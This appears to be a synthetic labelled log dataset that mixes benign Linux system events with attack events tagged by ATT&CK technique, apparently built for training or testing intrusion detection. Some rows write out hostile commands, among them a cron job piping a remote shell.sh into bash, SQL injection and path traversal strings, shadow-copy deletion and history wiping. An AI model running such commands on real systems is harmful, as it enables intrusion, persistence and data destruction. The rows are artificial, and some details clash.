+2023-10-14 11:23:23,192.168.1.15,developer,kernel,SYSTEM,WARNING,"Ext4-fs (sda1): warning: mounting unchecked fs, running e2fsck is recommended",T0000,Benign_Warning,0
+2023-10-14 11:23:58,192.168.1.15,jdoe,crond,CRON,INFO,pam_unix(cron:session): session opened for user 'jdoe' by (uid=0),T0000,Benign,0
+2023-10-14 11:25:40,10.0.0.12,admin,kernel,SYSTEM,WARNING,"Ext4-fs (sda1): warning: mounting unchecked fs, running e2fsck is recommended",T0000,Benign_Warning,0
+2023-10-14 11:26:23,192.168.1.15,asmith,systemd,DAEMON,INFO,Service 'postgresql' started successfully.,T0000,Benign,0
+2023-10-14 11:27:15,10.0.0.12,developer,systemd-logind,AUTH,INFO,New session c798 of user 'developer'.,T0000,Benign,0
+2023-10-14 11:29:01,104.22.15.9,root,sshd,AUTH,CRITICAL,Accepted password for root from 104.22.15.9 port 55070 ssh2 (Compromised account),T1078,Unauthorized_Access,1
+2023-10-14 11:30:25,192.168.1.45,developer,postgres,DATABASE,INFO,checkpoint starting: time,T0000,Benign,0
+2023-10-14 11:31:51,104.22.15.9,unknown,auditd,FILE_ACCESS,CRITICAL,File access denied: /etc/shadow access attempt by user 'www-data',T1003.008,Credential_Access,1
+2023-10-14 11:33:51,192.168.1.15,jdoe,postgres,DATABASE,INFO,checkpoint complete: wrote 845 buffers (5.2%); 0 WAL file(s) added,T0000,Benign,0
+2023-10-14 11:35:11,192.168.1.102,svc_backup,postgres,DATABASE,INFO,Database connection established from 192.168.1.102:5432,T0000,Benign,0
+2023-10-14 11:35:54,194.26.29.112,unknown,systemd,DEFENSE_EVASION,CRITICAL,Auditd logging daemon stopped by UID 0,T1562.001,Defense_Evasion,1
+2023-10-14 11:36:29,192.168.1.102,developer,crond,CRON,INFO,CMD (/usr/local/bin/backup_routine.sh > /dev/null 2>&1),T0000,Benign,0
+2023-10-14 11:36:36,192.168.1.102,bkumar,nginx,NETWORK,INFO,GET /dashboard HTTP/1.1 200 - 192.168.1.15,T0000,Benign,0
+2023-10-14 11:38:31,127.0.0.1,admin,kernel,FILE_ACCESS,INFO,audit: type=PATH msg=audit: item=0 name='/var/log/syslog' nametype=NORMAL,T0000,Benign,0
+2023-10-14 11:40:22,192.168.1.45,root,crond,CRON,INFO,pam_unix(cron:session): session opened for user 'root' by (uid=0),T0000,Benign,0
+2023-10-14 11:41:12,45.154.255.88,unknown,sudo,AUDIT,CRITICAL,pam_unix(sudo:auth): authentication failure; logname= uid=1001 euid=0 tty=/dev/pts/1,T1548.003,Privilege_Escalation,1
+2023-10-14 11:42:37,45.154.255.88,unknown,nginx,NETWORK,WARNING,Directory traversal attempt detected: GET /../../etc/passwd from 45.154.255.88,T1190,Path_Traversal,1
+2023-10-14 11:42:46,192.168.1.15,jdoe,kernel,FILE_ACCESS,INFO,audit: type=PATH msg=audit: item=0 name='/var/log/syslog' nametype=NORMAL,T0000,Benign,0
+2023-10-14 11:44:26,127.0.0.1,jdoe,systemd-logind,AUTH,INFO,New session c643 of user 'jdoe'.,T0000,Benign,0
+2023-10-14 11:45:35,192.168.1.102,jdoe,kernel,SYSTEM,WARNING,"Ext4-fs (sda1): warning: mounting unchecked fs, running e2fsck is recommended",T0000,Benign_Warning,0
+2023-10-14 11:47:23,192.168.1.15,asmith,kernel,SYSTEM,WARNING,"Ext4-fs (sda1): warning: mounting unchecked fs, running e2fsck is recommended",T0000,Benign_Warning,0
+2023-10-14 11:47:46,10.0.0.12,root,systemd-logind,AUTH,INFO,New session c923 of user 'root'.,T0000,Benign,0
+2023-10-14 11:49:02,192.168.1.15,bkumar,sshd,AUTH,WARNING,Failed password for invalid user 'guest' from 192.168.1.200 port 51221,T1110,Benign_Anomaly,0
+2023-10-14 11:49:22,192.168.1.102,svc_backup,nginx,NETWORK,INFO,GET /dashboard HTTP/1.1 200 - 192.168.1.15,T0000,Benign,0
+2023-10-14 11:51:12,192.168.1.45,admin,crond,CRON,INFO,CMD (/usr/local/bin/backup_routine.sh > /dev/null 2>&1),T0000,Benign,0
+2023-10-14 11:52:36,127.0.0.1,asmith,postgres,DATABASE,INFO,checkpoint complete: wrote 845 buffers (5.2%); 0 WAL file(s) added,T0000,Benign,0
+2023-10-14 11:52:49,192.168.1.102,svc_backup,postgres,DATABASE,INFO,checkpoint starting: time,T0000,Benign,0
+2023-10-14 11:53:08,45.154.255.88,unknown,nginx,NETWORK,WARNING,Directory traversal attempt detected: GET /../../etc/passwd from 45.154.255.88,T1190,Path_Traversal,1
+2023-10-14 11:53:27,185.220.101.5,unknown,kernel,SYSTEM,CRITICAL,Shadow copies deletion / system recovery disabled: vssadmin delete shadows,T1490,Inhibit_System_Recovery,1
+2023-10-14 11:54:30,127.0.0.1,svc_backup,kernel,FILE_ACCESS,INFO,audit: type=PATH msg=audit: item=0 name='/var/log/syslog' nametype=NORMAL,T0000,Benign,0
+2023-10-14 11:56:10,192.168.1.15,svc_backup,postgres,DATABASE,INFO,Database connection established from 192.168.1.15:5432,T0000,Benign,0
+2023-10-14 11:57:33,192.168.1.102,admin,crond,CRON,INFO,pam_unix(cron:session): session opened for user 'admin' by (uid=0),T0000,Benign,0
+2023-10-14 11:58:34,192.168.1.15,asmith,kernel,SYSTEM,WARNING,"Ext4-fs (sda1): warning: mounting unchecked fs, running e2fsck is recommended",T0000,Benign_Warning,0
+2023-10-14 11:59:48,192.168.1.15,asmith,nginx,NETWORK,INFO,GET /dashboard HTTP/1.1 200 - 192.168.1.15,T0000,Benign,0
+2023-10-14 12:00:17,10.0.0.12,root,kernel,SYSTEM,WARNING,"Ext4-fs (sda1): warning: mounting unchecked fs, running e2fsck is recommended",T0000,Benign_Warning,0
+2023-10-14 12:00:49,192.168.1.15,admin,nginx,NETWORK,INFO,GET /api/v1/health HTTP/1.1 200 - 192.168.1.45,T0000,Benign,0
+2023-10-14 12:01:25,192.168.1.45,developer,sshd,AUTH,WARNING,Failed password for invalid user 'guest' from 192.168.1.200 port 51221,T1110,Benign_Anomaly,0
+2023-10-14 12:03:07,192.168.1.45,jdoe,nginx,NETWORK,INFO,GET /api/v1/health HTTP/1.1 200 - 192.168.1.45,T0000,Benign,0
+2023-10-14 12:03:30,192.168.1.102,admin,nginx,NETWORK,INFO,GET /api/v1/health HTTP/1.1 200 - 192.168.1.45,T0000,Benign,0
+2023-10-14 12:03:51,192.168.1.15,jdoe,sshd,AUTH,WARNING,Failed password for invalid user 'guest' from 192.168.1.200 port 51221,T1110,Benign_Anomaly,0
+2023-10-14 12:03:59,185.220.101.5,root,sshd,FILE_ACCESS,CRITICAL,File /root/.ssh/authorized_keys modified by remote session,T1098.004,Persistence,1
+2023-10-14 12:04:06,185.220.101.5,unknown,nginx,NETWORK,WARNING,Directory traversal attempt detected: GET /../../etc/passwd from 185.220.101.5,T1190,Path_Traversal,1
+2023-10-14 12:05:18,194.26.29.112,unknown,nginx,NETWORK,WARNING,SQL Injection attempt: GET /login.php?user=admin' OR '1'='1 from 194.26.29.112,T1190,SQL_Injection,1
+2023-10-14 12:07:02,10.0.0.12,admin,nginx,NETWORK,INFO,GET /api/v1/health HTTP/1.1 200 - 192.168.1.45,T0000,Benign,0
+2023-10-14 12:08:25,45.154.255.88,unknown,kernel,FILE_ACCESS,CRITICAL,Rapid mass file modification: 154 files overwritten with extension .locked,T1486,Ransomware_Impact,1
+2023-10-14 12:09:52,10.0.0.12,bkumar,systemd,DAEMON,INFO,Service 'cron' started successfully.,T0000,Benign,0
+2023-10-14 12:10:10,192.168.1.15,admin,postgres,DATABASE,INFO,checkpoint starting: time,T0000,Benign,0
+2023-10-14 12:10:33,45.154.255.88,unknown,auditd,FILE_ACCESS,CRITICAL,File access denied: /etc/shadow access attempt by user 'www-data',T1003.008,Credential_Access,1
+2023-10-14 12:11:54,127.0.0.1,developer,postgres,DATABASE,INFO,checkpoint starting: time,T0000,Benign,0
+2023-10-14 12:13:40,127.0.0.1,svc_backup,kernel,SYSTEM,WARNING,"Ext4-fs (sda1): warning: mounting unchecked fs, running e2fsck is recommended",T0000,Benign_Warning,0
+2023-10-14 12:14:12,192.168.1.102,bkumar,systemd-logind,AUTH,INFO,New session c564 of user 'bkumar'.,T0000,Benign,0
+2023-10-14 12:15:08,10.0.0.12,asmith,systemd,DAEMON,INFO,Service 'postgresql' reloaded configuration.,T0000,Benign,0
+2023-10-14 12:15:45,10.0.0.12,svc_backup,sshd,AUTH,INFO,Accepted publickey for user 'svc_backup' from 10.0.0.12 port 43892 ssh2,T0000,Benign,0
+2023-10-14 12:17:36,104.22.15.9,root,bash,DEFENSE_EVASION,CRITICAL,Command history cleared: rm -f /root/.bash_history,T1070.003,Defense_Evasion,1
+2023-10-14 12:19:24,45.154.255.88,unknown,nginx,NETWORK,WARNING,Directory traversal attempt detected: GET /../../etc/passwd from 45.154.255.88,T1190,Path_Traversal,1
+2023-10-14 12:20:21,10.0.0.12,root,nginx,NETWORK,INFO,GET /dashboard HTTP/1.1 200 - 192.168.1.15,T0000,Benign,0
+2023-10-14 12:20:32,192.168.1.102,asmith,nginx,NETWORK,INFO,GET /api/v1/health HTTP/1.1 200 - 192.168.1.45,T0000,Benign,0
+2023-10-14 12:21:41,185.220.101.5,unknown,tar,PROCESS,WARNING,Archive creation of sensitive directory: tar -czf /tmp/backup.tar.gz /home /etc/ssl,T1560,Exfiltration_Staging,1
+2023-10-14 12:22:30,192.168.1.102,admin,crond,CRON,INFO,CMD (/usr/local/bin/backup_routine.sh > /dev/null 2>&1),T0000,Benign,0
+2023-10-14 12:24:18,127.0.0.1,root,postgres,DATABASE,INFO,checkpoint complete: wrote 845 buffers (5.2%); 0 WAL file(s) added,T0000,Benign,0
+2023-10-14 12:25:45,192.168.1.102,svc_backup,nginx,NETWORK,INFO,GET /api/v1/health HTTP/1.1 200 - 192.168.1.45,T0000,Benign,0
+2023-10-14 12:26:24,192.168.1.102,asmith,crond,CRON,INFO,pam_unix(cron:session): session opened for user 'asmith' by (uid=0),T0000,Benign,0
+2023-10-14 12:28:20,104.22.15.9,unknown,systemd,DEFENSE_EVASION,CRITICAL,Auditd logging daemon stopped by UID 0,T1562.001,Defense_Evasion,1
+2023-10-14 12:29:59,127.0.0.1,admin,systemd,DAEMON,INFO,Service 'nginx' started successfully.,T0000,Benign,0
+2023-10-14 12:30:57,192.168.1.102,asmith,sshd,AUTH,INFO,Accepted publickey for user 'asmith' from 192.168.1.102 port 43892 ssh2,T0000,Benign,0
+2023-10-14 12:32:41,192.168.1.15,admin,nginx,NETWORK,INFO,GET /api/v1/health HTTP/1.1 200 - 192.168.1.45,T0000,Benign,0
+2023-10-14 12:34:22,192.168.1.102,admin,nginx,NETWORK,INFO,GET /dashboard HTTP/1.1 200 - 192.168.1.15,T0000,Benign,0
+2023-10-14 12:35:21,192.168.1.102,bkumar,postgres,DATABASE,INFO,checkpoint starting: time,T0000,Benign,0
+2023-10-14 12:36:31,104.22.15.9,root,bash,DEFENSE_EVASION,CRITICAL,Command history cleared: rm -f /root/.bash_history,T1070.003,Defense_Evasion,1
+2023-10-14 12:38:02,192.168.1.102,developer,postgres,DATABASE,INFO,checkpoint starting: time,T0000,Benign,0
+2023-10-14 12:38:57,192.168.1.45,admin,systemd,DAEMON,INFO,Service 'postgresql' started successfully.,T0000,Benign,0
+2023-10-14 12:40:40,45.154.255.88,unknown,auditd,FILE_ACCESS,CRITICAL,File access denied: /etc/shadow access attempt by user 'www-data',T1003.008,Credential_Access,1
+2023-10-14 12:41:00,185.220.101.5,root,bash,DEFENSE_EVASION,CRITICAL,Command history cleared: rm -f /root/.bash_history,T1070.003,Defense_Evasion,1
+2023-10-14 12:41:53,127.0.0.1,developer,systemd-logind,AUTH,INFO,New session c784 of user 'developer'.,T0000,Benign,0
+2023-10-14 12:43:41,192.168.1.15,root,postgres,DATABASE,INFO,Database connection established from 192.168.1.15:5432,T0000,Benign,0
+2023-10-14 12:44:44,127.0.0.1,asmith,kernel,SYSTEM,WARNING,"Ext4-fs (sda1): warning: mounting unchecked fs, running e2fsck is recommended",T0000,Benign_Warning,0
+2023-10-14 12:45:40,192.168.1.15,asmith,postgres,DATABASE,INFO,Database connection established from 192.168.1.15:5432,T0000,Benign,0
+2023-10-14 12:46:26,45.154.255.88,unknown,curl,NETWORK,CRITICAL,"High volume outbound data transfer to 45.154.255.88:4444 (Payload: /etc/shadow, /var/db)",T1048,Exfiltration,1
+2023-10-14 12:47:26,127.0.0.1,bkumar,systemd-logind,AUTH,INFO,New session c636 of user 'bkumar'.,T0000,Benign,0
+2023-10-14 12:47:41,192.168.1.102,svc_backup,crond,CRON,INFO,pam_unix(cron:session): session opened for user 'svc_backup' by (uid=0),T0000,Benign,0
+2023-10-14 12:49:25,104.22.15.9,unknown,kernel,FILE_ACCESS,CRITICAL,Rapid mass file modification: 154 files overwritten with extension .locked,T1486,Ransomware_Impact,1
+2023-10-14 12:50:35,45.154.255.88,root,sshd,FILE_ACCESS,CRITICAL,File /root/.ssh/authorized_keys modified by remote session,T1098.004,Persistence,1
+2023-10-14 12:51:10,185.220.101.5,unknown,auditd,FILE_ACCESS,CRITICAL,File access denied: /etc/shadow access attempt by user 'www-data',T1003.008,Credential_Access,1
+2023-10-14 12:52:32,185.220.101.5,unknown,nginx,NETWORK,WARNING,SQL Injection attempt: GET /login.php?user=admin' OR '1'='1 from 185.220.101.5,T1190,SQL_Injection,1
+2023-10-14 12:53:36,10.0.0.12,developer,sshd,AUTH,WARNING,Failed password for invalid user 'guest' from 192.168.1.200 port 51221,T1110,Benign_Anomaly,0
+2023-10-14 12:55:03,192.168.1.102,asmith,nginx,NETWORK,INFO,GET /api/v1/health HTTP/1.1 200 - 192.168.1.45,T0000,Benign,0
+2023-10-14 12:55:16,192.168.1.102,asmith,nginx,NETWORK,INFO,GET /dashboard HTTP/1.1 200 - 192.168.1.15,T0000,Benign,0
+2023-10-14 12:56:06,10.0.0.12,bkumar,crond,CRON,INFO,pam_unix(cron:session): session opened for user 'bkumar' by (uid=0),T0000,Benign,0
+2023-10-14 12:56:58,192.168.1.15,svc_backup,systemd,DAEMON,INFO,Service 'sshd' reloaded configuration.,T0000,Benign,0
+2023-10-14 12:58:07,192.168.1.15,developer,nginx,NETWORK,INFO,GET /api/v1/health HTTP/1.1 200 - 192.168.1.45,T0000,Benign,0
+2023-10-14 12:59:25,10.0.0.12,developer,crond,CRON,INFO,CMD (/usr/local/bin/backup_routine.sh > /dev/null 2>&1),T0000,Benign,0
+2023-10-14 12:59:37,192.168.1.102,root,sshd,AUTH,WARNING,Failed password for invalid user 'guest' from 192.168.1.200 port 51221,T1110,Benign_Anomaly,0
+2023-10-14 13:00:46,10.0.0.12,jdoe,systemd,DAEMON,INFO,Service 'cron' started successfully.,T0000,Benign,0
+2023-10-14 13:01:57,192.168.1.102,asmith,crond,CRON,INFO,CMD (/usr/local/bin/backup_routine.sh > /dev/null 2>&1),T0000,Benign,0
+2023-10-14 13:03:41,192.168.1.102,admin,nginx,NETWORK,INFO,GET /api/v1/health HTTP/1.1 200 - 192.168.1.45,T0000,Benign,0
+2023-10-14 13:03:58,192.168.1.102,asmith,postgres,DATABASE,INFO,Database connection established from 192.168.1.102:5432,T0000,Benign,0
+2023-10-14 13:05:27,192.168.1.45,root,nginx,NETWORK,INFO,GET /api/v1/health HTTP/1.1 200 - 192.168.1.45,T0000,Benign,0
+2023-10-14 13:06:46,10.0.0.12,asmith,crond,CRON,INFO,CMD (/usr/local/bin/backup_routine.sh > /dev/null 2>&1),T0000,Benign,0
+2023-10-14 13:08:21,10.0.0.12,developer,crond,CRON,INFO,pam_unix(cron:session): session opened for user 'developer' by (uid=0),T0000,Benign,0
+2023-10-14 13:09:08,127.0.0.1,svc_backup,nginx,NETWORK,INFO,GET /dashboard HTTP/1.1 200 - 192.168.1.15,T0000,Benign,0
+2023-10-14 13:10:38,192.168.1.102,admin,crond,CRON,INFO,CMD (/usr/local/bin/backup_routine.sh > /dev/null 2>&1),T0000,Benign,0
+2023-10-14 13:11:10,192.168.1.45,bkumar,sshd,AUTH,WARNING,Failed password for invalid user 'guest' from 192.168.1.200 port 51221,T1110,Benign_Anomaly,0
+2023-10-14 13:11:34,104.22.15.9,root,sshd,AUTH,WARNING,Failed password for root from 104.22.15.9 port 52070 ssh2,T1110.001,Brute_Force,1
+2023-10-14 13:13:31,10.0.0.12,developer,sshd,AUTH,INFO,Accepted publickey for user 'developer' from 10.0.0.12 port 43892 ssh2,T0000,Benign,0
+2023-10-14 13:13:59,192.168.1.45,developer,sshd,AUTH,WARNING,Failed password for invalid user 'guest' from 192.168.1.200 port 51221,T1110,Benign_Anomaly,0
+2023-10-14 13:14:09,192.168.1.45,svc_backup,nginx,NETWORK,INFO,GET /dashboard HTTP/1.1 200 - 192.168.1.15,T0000,Benign,0
+2023-10-14 13:14:50,192.168.1.45,bkumar,sshd,AUTH,WARNING,Failed password for invalid user 'guest' from 192.168.1.200 port 51221,T1110,Benign_Anomaly,0
+2023-10-14 13:15:34,192.168.1.45,bkumar,sshd,AUTH,WARNING,Failed password for invalid user 'guest' from 192.168.1.200 port 51221,T1110,Benign_Anomaly,0
+2023-10-14 13:16:52,192.168.1.102,root,postgres,DATABASE,INFO,checkpoint starting: time,T0000,Benign,0
+2023-10-14 13:18:01,192.168.1.45,root,sshd,AUTH,INFO,Accepted publickey for user 'root' from 192.168.1.45 port 43892 ssh2,T0000,Benign,0
+2023-10-14 13:18:23,10.0.0.12,svc_backup,systemd,DAEMON,INFO,Service 'rsyslog' started successfully.,T0000,Benign,0
+2023-10-14 13:19:38,127.0.0.1,root,kernel,FILE_ACCESS,INFO,audit: type=PATH msg=audit: item=0 name='/var/log/syslog' nametype=NORMAL,T0000,Benign,0
+2023-10-14 13:20:19,45.154.255.88,root,sshd,AUTH,CRITICAL,Accepted password for root from 45.154.255.88 port 59446 ssh2 (Compromised account),T1078,Unauthorized_Access,1
+2023-10-14 13:22:19,192.168.1.15,bkumar,kernel,SYSTEM,WARNING,"Ext4-fs (sda1): warning: mounting unchecked fs, running e2fsck is recommended",T0000,Benign_Warning,0
+2023-10-14 13:23:21,192.168.1.15,bkumar,systemd,DAEMON,INFO,Service 'cron' started successfully.,T0000,Benign,0
+2023-10-14 13:24:13,45.154.255.88,unknown,nginx,NETWORK,WARNING,SQL Injection attempt: GET /login.php?user=admin' OR '1'='1 from 45.154.255.88,T1190,SQL_Injection,1
+2023-10-14 13:24:21,192.168.1.102,root,systemd,DAEMON,INFO,Service 'rsyslog' reloaded configuration.,T0000,Benign,0
+2023-10-14 13:24:43,185.220.101.5,unknown,tar,PROCESS,WARNING,Archive creation of sensitive directory: tar -czf /tmp/backup.tar.gz /home /etc/ssl,T1560,Exfiltration_Staging,1
+2023-10-14 13:25:45,192.168.1.102,admin,systemd,DAEMON,INFO,Service 'nginx' reloaded configuration.,T0000,Benign,0
+2023-10-14 13:26:09,127.0.0.1,developer,kernel,FILE_ACCESS,INFO,audit: type=PATH msg=audit: item=0 name='/var/log/syslog' nametype=NORMAL,T0000,Benign,0
+2023-10-14 13:27:53,192.168.1.15,admin,crond,CRON,INFO,pam_unix(cron:session): session opened for user 'admin' by (uid=0),T0000,Benign,0
+2023-10-14 13:29:19,192.168.1.15,admin,postgres,DATABASE,INFO,checkpoint starting: time,T0000,Benign,0
+2023-10-14 13:30:40,127.0.0.1,developer,nginx,NETWORK,INFO,GET /dashboard HTTP/1.1 200 - 192.168.1.15,T0000,Benign,0
+2023-10-14 13:31:03,192.168.1.102,developer,systemd,DAEMON,INFO,Service 'nginx' started successfully.,T0000,Benign,0
+2023-10-14 13:32:01,45.154.255.88,unknown,nginx,NETWORK,WARNING,SQL Injection attempt: GET /login.php?user=admin' OR '1'='1 from 45.154.255.88,T1190,SQL_Injection,1
+2023-10-14 13:33:13,127.0.0.1,developer,sshd,AUTH,WARNING,Failed password for invalid user 'guest' from 192.168.1.200 port 51221,T1110,Benign_Anomaly,0
+2023-10-14 13:35:09,192.168.1.102,bkumar,nginx,NETWORK,INFO,GET /dashboard HTTP/1.1 200 - 192.168.1.15,T0000,Benign,0
+2023-10-14 13:35:16,192.168.1.45,asmith,systemd,DAEMON,INFO,Service 'ufw' reloaded configuration.,T0000,Benign,0
+2023-10-14 13:36:41,45.154.255.88,unknown,systemd,SYSTEM,CRITICAL,SYSTEM SHUTDOWN INITIATED by UID 0 (Anti-forensics evasion),T1529,Anti_Forensics,1
+2023-10-14 13:36:51,192.168.1.45,root,crond,CRON,INFO,CMD (/usr/local/bin/backup_routine.sh > /dev/null 2>&1),T0000,Benign,0
+2023-10-14 13:38:23,192.168.1.45,bkumar,kernel,FILE_ACCESS,INFO,audit: type=PATH msg=audit: item=0 name='/var/log/syslog' nametype=NORMAL,T0000,Benign,0
+2023-10-14 13:38:36,192.168.1.102,admin,postgres,DATABASE,INFO,checkpoint starting: time,T0000,Benign,0
+2023-10-14 13:40:22,45.154.255.88,unknown,nginx,NETWORK,WARNING,Directory traversal attempt detected: GET /../../etc/passwd from 45.154.255.88,T1190,Path_Traversal,1
+2023-10-14 13:41:32,10.0.0.12,developer,kernel,SYSTEM,WARNING,"Ext4-fs (sda1): warning: mounting unchecked fs, running e2fsck is recommended",T0000,Benign_Warning,0
+2023-10-14 13:43:13,192.168.1.15,asmith,crond,CRON,INFO,pam_unix(cron:session): session opened for user 'asmith' by (uid=0),T0000,Benign,0
+2023-10-14 13:44:00,194.26.29.112,root,sshd,FILE_ACCESS,CRITICAL,File /root/.ssh/authorized_keys modified by remote session,T1098.004,Persistence,1
+2023-10-14 13:45:40,192.168.1.45,asmith,postgres,DATABASE,INFO,Database connection established from 192.168.1.45:5432,T0000,Benign,0
+2023-10-14 13:46:48,192.168.1.102,developer,sshd,AUTH,WARNING,Failed password for invalid user 'guest' from 192.168.1.200 port 51221,T1110,Benign_Anomaly,0
+2023-10-14 13:48:26,192.168.1.45,developer,postgres,DATABASE,INFO,Database connection established from 192.168.1.45:5432,T0000,Benign,0
+2023-10-14 13:49:12,45.154.255.88,root,crontab,AUDIT,CRITICAL,New cron job added for user root: '* * * * * curl http://45.154.255.88/shell.sh | bash',T1053.003,Persistence,1
+2023-10-14 13:50:14,10.0.0.12,jdoe,postgres,DATABASE,INFO,Database connection established from 10.0.0.12:5432,T0000,Benign,0
+2023-10-14 13:50:24,10.0.0.12,developer,crond,CRON,INFO,CMD (/usr/local/bin/backup_routine.sh > /dev/null 2>&1),T0000,Benign,0
+2023-10-14 13:52:10,10.0.0.12,svc_backup,systemd,DAEMON,INFO,Service 'postgresql' reloaded configuration.,T0000,Benign,0
+2023-10-14 13:53:57,192.168.1.45,admin,sshd,AUTH,INFO,Accepted publickey for user 'admin' from 192.168.1.45 port 43892 ssh2,T0000,Benign,0
+2023-10-14 13:55:28,192.168.1.15,jdoe,systemd,DAEMON,INFO,Service 'nginx' started successfully.,T0000,Benign,0
+2023-10-14 13:56:55,192.168.1.15,developer,postgres,DATABASE,INFO,Database connection established from 192.168.1.15:5432,T0000,Benign,0
+2023-10-14 13:58:26,10.0.0.12,asmith,crond,CRON,INFO,CMD (/usr/local/bin/backup_routine.sh > /dev/null 2>&1),T0000,Benign,0
+2023-10-14 13:59:44,194.26.29.112,root,sshd,FILE_ACCESS,CRITICAL,File /root/.ssh/authorized_keys modified by remote session,T1098.004,Persistence,1
+2023-10-14 14:01:12,104.22.15.9,root,sshd,AUTH,WARNING,Failed password for root from 104.22.15.9 port 42192 ssh2,T1110.001,Brute_Force,1
+2023-10-14 14:02:20,192.168.1.102,admin,postgres,DATABASE,INFO,checkpoint complete: wrote 845 buffers (5.2%); 0 WAL file(s) added,T0000,Benign,0
+2023-10-14 14:03:55,10.0.0.12,asmith,nginx,NETWORK,INFO,GET /api/v1/health HTTP/1.1 200 - 192.168.1.45,T0000,Benign,0
+2023-10-14 14:04:17,10.0.0.12,jdoe,postgres,DATABASE,INFO,checkpoint starting: time,T0000,Benign,0
+2023-10-14 14:05:49,192.168.1.102,svc_backup,crond,CRON,INFO,CMD (/usr/local/bin/backup_routine.sh > /dev/null 2>&1),T0000,Benign,0
+2023-10-14 14:07:04,192.168.1.45,root,crond,CRON,INFO,pam_unix(cron:session): session opened for user 'root' by (uid=0),T0000,Benign,0
+2023-10-14 14:08:38,127.0.0.1,asmith,sshd,AUTH,WARNING,Failed password for invalid user 'guest' from 192.168.1.200 port 51221,T1110,Benign_Anomaly,0
+2023-10-14 14:09:08,10.0.0.12,root,systemd-logind,AUTH,INFO,New session c469 of user 'root'.,T0000,Benign,0
+2023-10-14 14:10:23,127.0.0.1,root,postgres,DATABASE,INFO,checkpoint starting: time,T0000,Benign,0
+2023-10-14 14:12:21,194.26.29.112,root,kernel,PROCESS,CRITICAL,Suspicious process spawn: /tmp/.hidden_exploit executed with root UID,T1059.004,Execution,1
+2023-10-14 14:13:33,127.0.0.1,root,postgres,DATABASE,INFO,Database connection established from 127.0.0.1:5432,T0000,Benign,0
+2023-10-14 14:14:18,127.0.0.1,bkumar,postgres,DATABASE,INFO,checkpoint starting: time,T0000,Benign,0
+2023-10-14 14:16:15,127.0.0.1,svc_backup,postgres,DATABASE,INFO,checkpoint complete: wrote 845 buffers (5.2%); 0 WAL file(s) added,T0000,Benign,0
+2023-10-14 14:16:36,192.168.1.15,admin,kernel,SYSTEM,WARNING,"Ext4-fs (sda1): warning: mounting unchecked fs, running e2fsck is recommended",T0000,Benign_Warning,0
+2023-10-14 14:17:19,185.220.101.5,root,crontab,AUDIT,CRITICAL,New cron job added for user root: '* * * * * curl http://185.220.101.5/shell.sh | bash',T1053.003,Persistence,1
+2023-10-14 14:18:30,192.168.1.102,admin,kernel,SYSTEM,WARNING,"Ext4-fs (sda1): warning: mounting unchecked fs, running e2fsck is recommended",T0000,Benign_Warning,0
+2023-10-14 14:19:45,104.22.15.9,root,kernel,PROCESS,CRITICAL,Suspicious process spawn: /tmp/.hidden_exploit executed with root UID,T1059.004,Execution,1
+2023-10-14 14:21:12,185.220.101.5,unknown,systemd,SYSTEM,CRITICAL,SYSTEM SHUTDOWN INITIATED by UID 0 (Anti-forensics evasion),T1529,Anti_Forensics,1
+2023-10-14 14:22:41,127.0.0.1,asmith,nginx,NETWORK,INFO,GET /api/v1/health HTTP/1.1 200 - 192.168.1.45,T0000,Benign,0
+2023-10-14 14:24:36,45.154.255.88,unknown,nginx,NETWORK,WARNING,Directory traversal attempt detected: GET /../../etc/passwd from 45.154.255.88,T1190,Path_Traversal,1
+2023-10-14 14:26:19,192.168.1.15,svc_backup,nginx,NETWORK,INFO,GET /api/v1/health HTTP/1.1 200 - 192.168.1.45,T0000,Benign,0
+2023-10-14 14:27:33,192.168.1.45,bkumar,crond,CRON,INFO,pam_unix(cron:session): session opened for user 'bkumar' by (uid=0),T0000,Benign,0
+2023-10-14 14:29:05,192.168.1.15,admin,postgres,DATABASE,INFO,checkpoint starting: time,T0000,Benign,0
+2023-10-14 14:30:03,127.0.0.1,asmith,systemd-logind,AUTH,INFO,New session c420 of user 'asmith'.,T0000,Benign,0
+2023-10-14 14:31:58,192.168.1.102,root,kernel,FILE_ACCESS,INFO,audit: type=PATH msg=audit: item=0 name='/var/log/syslog' nametype=NORMAL,T0000,Benign,0
+2023-10-14 14:33:40,192.168.1.102,admin,postgres,DATABASE,INFO,checkpoint complete: wrote 845 buffers (5.2%); 0 WAL file(s) added,T0000,Benign,0
+2023-10-14 14:34:00,185.220.101.5,unknown,kernel,AUDIT,CRITICAL,Privilege escalation: UID 1001 modified SUID bit on /bin/bash,T1548.001,Privilege_Escalation,1
+2023-10-14 14:34:11,127.0.0.1,root,postgres,DATABASE,INFO,Database connection established from 127.0.0.1:5432,T0000,Benign,0
+2023-10-14 14:36:06,127.0.0.1,asmith,kernel,SYSTEM,WARNING,"Ext4-fs (sda1): warning: mounting unchecked fs, running e2fsck is recommended",T0000,Benign_Warning,0
+2023-10-14 14:36:35,10.0.0.12,developer,postgres,DATABASE,INFO,checkpoint starting: time,T0000,Benign,0
+2023-10-14 14:37:43,194.26.29.112,unknown,systemd,DEFENSE_EVASION,CRITICAL,Auditd logging daemon stopped by UID 0,T1562.001,Defense_Evasion,1
+2023-10-14 14:38:15,192.168.1.102,admin,systemd,DAEMON,INFO,Service 'cron' started successfully.,T0000,Benign,0
+2023-10-14 14:40:12,192.168.1.102,bkumar,nginx,NETWORK,INFO,GET /dashboard HTTP/1.1 200 - 192.168.1.15,T0000,Benign,0
+2023-10-14 14:42:05,45.154.255.88,unknown,sshd,AUTH,WARNING,Failed password for invalid user 'oracle' from 45.154.255.88 port 53971 ssh2,T1110.001,Brute_Force,1
+2023-10-14 14:43:47,192.168.1.15,bkumar,systemd,DAEMON,INFO,Service 'sshd' started successfully.,T0000,Benign,0
+2023-10-14 14:44:16,10.0.0.12,admin,crond,CRON,INFO,pam_unix(cron:session): session opened for user 'admin' by (uid=0),T0000,Benign,0
+2023-10-14 14:45:58,127.0.0.1,developer,kernel,SYSTEM,WARNING,"Ext4-fs (sda1): warning: mounting unchecked fs, running e2fsck is recommended",T0000,Benign_Warning,0
+2023-10-14 14:46:15,127.0.0.1,asmith,sshd,AUTH,WARNING,Failed password for invalid user 'guest' from 192.168.1.200 port 51221,T1110,Benign_Anomaly,0
+2023-10-14 14:46:38,194.26.29.112,unknown,kernel,FILE_ACCESS,CRITICAL,Rapid mass file modification: 154 files overwritten with extension .locked,T1486,Ransomware_Impact,1
+2023-10-14 14:46:48,45.154.255.88,unknown,sshd,AUTH,WARNING,Failed password for invalid user 'oracle' from 45.154.255.88 port 61047 ssh2,T1110.001,Brute_Force,1
